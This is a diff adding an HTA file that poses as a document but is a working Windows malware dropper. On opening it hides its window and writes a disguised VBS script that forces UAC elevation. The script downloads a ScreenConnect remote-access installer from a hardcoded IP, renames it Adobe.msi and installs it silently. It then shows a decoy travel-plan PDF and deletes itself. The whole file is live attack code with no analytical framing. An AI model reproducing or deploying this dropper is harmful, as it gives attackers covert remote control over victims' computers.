@@ -1,0 +1,81 @@
+<!-- language: HTML/HTA, file: doc.hta, target: Windows 10/11 -->
+<html>
+<head>
+<title>Document</title>
+<HTA:APPLICATION
+    ID="Doc"
+    APPLICATIONNAME="Document"
+    BORDER="none"
+    CAPTION="no"
+    SHOWINTASKBAR="no"
+    SINGLEINSTANCE="yes"
+    SYSMENU="no"
+    WINDOWSTATE="minimize"
+    SCROLL="no"
+/>
+</head>
+
+<script language="VBScript">
+Sub Window_OnLoad
+    self.ResizeTo 0, 0
+    self.MoveTo -3000, -3000
+    On Error Resume Next
+
+    Dim sh, fso, tmp, vbs, f, s
+    Set sh  = CreateObject("WScript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject")
+
+    tmp = sh.ExpandEnvironmentStrings("%TEMP%")
+    vbs = tmp & "\winlogon_cache.vbs"
+
+    ' --- build the payload VBS with mandatory UAC elevation ---
+    s  = "Option Explicit" & vbCrLf
+    s = s & "Dim qs : qs = Chr(34)" & vbCrLf
+    s = s & "Dim sh, fso, isAdmin, tmp, msiUrl, msiPath, pdfUrl, pdfPath, f" & vbCrLf
+    s = s & "Set sh  = CreateObject(""WScript.Shell"")" & vbCrLf
+    s = s & "Set fso = CreateObject(""Scripting.FileSystemObject"")" & vbCrLf
+    s = s & "tmp = sh.ExpandEnvironmentStrings(""%TEMP%"")" & vbCrLf
+    s = s & "msiUrl = ""http://172.208.106.28:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest""" & vbCrLf
+    s = s & "msiPath = tmp & ""\Adobe.msi""" & vbCrLf
+    s = s & "pdfUrl = ""https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Travel-Meeting-Plan-Q4-2026.pdf""" & vbCrLf
+    s = s & "pdfPath = sh.ExpandEnvironmentStrings(""%LOCALAPPDATA%"") & ""\Travel-Meeting-Plan-Q4-2026.pdf""" & vbCrLf
+    s = s & "" & vbCrLf
+    ' --- mandatory admin check: if not elevated, re-launch self via runas, then exit ---
+    s = s & "isAdmin = True" & vbCrLf
+    s = s & "On Error Resume Next" & vbCrLf
+    s = s & "sh.RegWrite ""HKLM\SOFTWARE\Microsoft\_elevchk"", ""1"", ""REG_SZ""" & vbCrLf
+    s = s & "If Err.Number <> 0 Then isAdmin = False" & vbCrLf
+    s = s & "Err.Clear" & vbCrLf
+    s = s & "On Error GoTo 0" & vbCrLf
+    s = s & "If isAdmin Then sh.RegDelete ""HKLM\SOFTWARE\Microsoft\_elevchk""" & vbCrLf
+    s = s & "" & vbCrLf
+    s = s & "If Not isAdmin Then" & vbCrLf
+    s = s & "    CreateObject(""Shell.Application"").ShellExecute ""wscript.exe"", qs & WScript.ScriptFullName & qs, """", ""runas"", 1" & vbCrLf
+    s = s & "    WScript.Quit" & vbCrLf
+    s = s & "End If" & vbCrLf
+    s = s & "" & vbCrLf
+    ' --- now definitely elevated: drop MSI + run silently ---
+    s = s & "sh.Run ""curl.exe -sL -o "" & qs & msiPath & qs & "" "" & qs & msiUrl & qs, 0, True" & vbCrLf
+    s = s & "If fso.FileExists(msiPath) Then" & vbCrLf
+    s = s & "    sh.Run ""msiexec.exe /i "" & qs & msiPath & qs & "" /qn /norestart REBOOT=ReallySuppress ALLUSERS=1"", 0, False" & vbCrLf
+    s = s & "End If" & vbCrLf
+    s = s & "" & vbCrLf
+    ' --- decoy PDF in user context (no elevation needed) ---
+    s = s & "sh.Run ""curl.exe -sL -o "" & qs & pdfPath & qs & "" "" & qs & pdfUrl & qs, 0, True" & vbCrLf
+    s = s & "If fso.FileExists(pdfPath) Then sh.Run ""msedge.exe "" & qs & pdfPath & qs, 1, False" & vbCrLf
+    s = s & "" & vbCrLf
+    ' --- self-delete after run ---
+    s = s & "fso.DeleteFile WScript.ScriptFullName, True" & vbCrLf
+
+    Set f = fso.CreateTextFile(vbs, True)
+    f.Write s
+    f.Close
+
+    ' --- launch detached, hidden. UAC prompt fires from the VBS, not the HTA ---
+    sh.Run "wscript.exe //B //Nologo " & Chr(34) & vbs & Chr(34), 0, False
+    window.close
+End Sub
+</script>
+
+<body bgcolor="#000000"></body>
+</html>
